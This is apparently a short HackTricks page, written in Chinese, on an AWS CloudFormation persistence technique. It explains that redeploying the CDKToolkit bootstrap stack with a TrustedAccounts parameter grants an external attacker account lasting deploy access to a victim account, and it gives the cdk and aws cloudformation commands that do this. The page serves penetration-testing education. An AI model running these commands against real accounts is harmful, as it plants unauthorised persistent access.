# AWS - Cloudformation Persistence

{{#include ../../../banners/hacktricks-training.md}}

## CloudFormation

有关更多信息，请访问：

{{#ref}}
../aws-services/aws-cloudformation-and-codestar-enum.md
{{#endref}}

### CDK Bootstrap Stack

AWS CDK 部署一个名为 `CDKToolkit` 的 CFN 堆栈。该堆栈支持一个参数 `TrustedAccounts`，允许外部账户将 CDK 项目部署到受害者账户中。攻击者可以利用这一点授予自己对受害者账户的无限访问权限，方法是使用 AWS cli 重新部署带参数的堆栈，或使用 AWS CDK cli。
```bash
# CDK
cdk bootstrap --trust 1234567890

# AWS CLI
aws cloudformation update-stack --use-previous-template --parameters ParameterKey=TrustedAccounts,ParameterValue=1234567890
```
{{#include ../../../banners/hacktricks-training.md}}
